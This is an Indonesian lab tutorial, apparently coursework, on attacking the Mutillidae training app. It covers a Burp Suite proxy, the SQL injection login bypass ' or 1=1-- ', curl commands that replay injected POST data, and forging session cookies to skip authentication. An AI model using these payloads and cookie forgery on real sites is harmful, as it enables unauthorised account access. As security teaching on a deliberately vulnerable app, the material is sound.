# SQL Injection, Burpsuite, cURL, Man-In-The-Middle Attack

1. untuk melakukan Man-in-the-Middle Attack proxy browser harus diarahkan ke ip yang melakukan MitM. dalam kasus ini untuk mensimulasikan MitM attack kita mengarahkan proxy ke 127.0.0.1 (localhost) dan port 8000.
![1](/lesson6/1.png)

2. Buka aplikasi Burpsuite untuk melakukan sniffing
![1](/lesson6/2.png)
![1](/lesson6/3.png)
![1](/lesson6/4.png)

3. Buka tab proxy lalu ke sub-tab options. pastikan proxy listener mengarah ke alamat yang benar (dalam kasus ini 127.0.0.1 port 8000).
![1](/lesson6/5.png)

4. Buka sub-tab intercept dari tab proxy dan pastikan "intercept is off"
![1](/lesson6/6.png)

5. Buka halaman login dari mutillidae dan lakukan sql injection dasar untuk login
```
' or 1=1-- '
```
Jangan lupa menambahkan spasi setelah sintaks comment ```"-- "```
![1](/lesson6/7.png)

6. Buka Burpsuite dan cari urlnya yang mengandung string ```/mutillidae/index.php?page=login.php```
![1](/lesson6/8.png)

7. Gunakan curl dengan post data yang didapatkan pada Burpsuite untuk mengambil source code dari halaman yang sudah terkena sql injection dan memasukkannya kedalam file login.txt
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1--+&password=&login-php-submit-button=Login" --location "http://10.151.36.156/mutillidae/index.php?page=login.php" > login1.txt
```
![1](/lesson6/9.png)

8. ambil string yang mengandung ```Logged In``` pada file ```login.txt``` dengan mengetikkan command:
```
grep "Logged In" login.txt
```
![1](/lesson6/10.png)

9. Buka file crack_cookies.txt yang tadi dibuat saat curl dan analisa isinya.
```
cat crack_cookies.txt
```
![1](/lesson6/11.png)
 * di baris atas ada session ID yang dapat digunakan sebagai passwod sementara (akses masuk)
 * UID 1 menandakan bahwa user tersebut adalah record pertama di database

10. kembali ke halaman login, isikan name dengan "samurai" lalu inspect element pada kolom password dan ubah maxlength menjadi 50 ```maxlength="50"```
![1](/lesson6/12.png)

11. Lakukan sniffing request pada Burpsuite lagi
![1](/lesson6/13.png)

12. block semua raw request pada paket tersebut lalu save ke file dengan nama burp2.txt
![1](/lesson6/14.png)

13. cari pada file burp2.txt yang mengandung string cookie dan username
```
grep -i cookie burp2.txt
```
```
grep -i username burp2.txt
```
![1](/lesson6/15.png)

14. lakukan curl seperti pada langkah sebelumnya dengan menggunakan post data yang didapat dari Burpsuite yang terakhir dan analisa cookienya
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29--+&login-php-submit-button=Login" --location "http://10.151.36.156/mutillidae/index.php?page=login.php" > login2.txt
```
![1](/lesson6/16.png)

15. Sekarang matikan proxy dan gunakan cookie manager saat berada di halaman login untuk membuat cookie agar dapat login tanpa menggunakan autentikasi
 * ![1](/lesson6/17.png)
 * ![1](/lesson6/18.png)

16. buat cookie seperti pada gambar dibawah
 * ![1](/lesson6/19.png)
 * ![1](/lesson6/20.png)
 * ![1](/lesson6/21.png)
 * ![1](/lesson6/22.png)
 * ![1](/lesson6/23.png)
17. setelah semua cookie dibuat sesuai dengan data yang didapatkan dari burp dan curl. maka kita dapat masuk tanpa menggunakan fitur login autentikasi.
![1](/lesson6/24.png)
